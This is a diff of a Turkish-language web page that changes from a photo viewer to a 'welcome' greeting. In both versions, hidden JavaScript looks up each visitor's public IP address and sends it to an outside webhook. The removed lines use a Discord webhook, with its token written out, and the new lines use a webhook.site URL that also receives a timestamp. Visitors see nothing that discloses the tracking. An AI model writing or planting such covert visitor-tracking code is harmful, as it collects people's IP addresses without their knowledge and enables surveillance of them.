@@ -2,34 +2,20 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Fotoğraf Göster</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #000;
-    }
-    img {
-      max-width: 100%;
-      max-height: 100%;
-    }
-  </style>
+  <title>Merhaba</title>
 </head>
-<body>
-  <img src="fotoğraf.png" alt="Görsel" />
+<body style="margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#000; color:white; font-family:sans-serif;">
+  <h1>Merhaba, hoş geldin!</h1>
 
   <script>
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
         const ip = data.ip;
+        console.log("IP adresin:", ip); // Konsola yazdır
 
-        // Kendi Discord Webhook linkini buraya yapıştır
-        const webhookURL = 'https://discord.com/api/webhooks/1387792925454503936/ewUa4tg_qp7aR7sBrNec76_bm4XBZ4ZbUIFXn8bi8_nrLewuIyjmPpEVEaNsVmugHcs-';
+        // webhook.site linkin
+        const webhookURL = 'https://webhook.site/e76bdd03-1a61-462f-a6f5-3cf243d79e42';
 
         fetch(webhookURL, {
           method: 'POST',
@@ -37,9 +23,11 @@
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
-            content: `Yeni ziyaretçi IP: ${ip}`
+            ip_adresi: ip,
+            zaman: new Date().toLocaleString(),
+            mesaj: "Yeni biri siteyi ziyaret etti"
           })
-        });
+        }).then(() => console.log("Gönderildi")).catch(console.error);
       })
       .catch(console.error);
   </script>
